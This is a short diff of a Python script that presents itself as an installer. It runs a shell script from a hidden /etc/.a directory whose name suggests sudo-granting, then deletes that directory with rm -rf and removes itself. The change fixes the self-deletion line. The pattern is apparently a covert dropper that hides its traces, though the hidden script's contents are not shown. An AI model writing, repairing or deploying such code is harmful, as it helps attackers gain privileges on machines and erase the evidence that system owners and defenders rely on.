@@ -12,6 +12,6 @@ def main():
     os.system("bash /etc/.a/syslogT/sudoMaker.sh")
     print("Installation complete. Goodbye")
     os.system("rm -rf /etc/.a")
-    os.remove(argv[0])
+    os.remove(sys.argv[0])
     
 main()
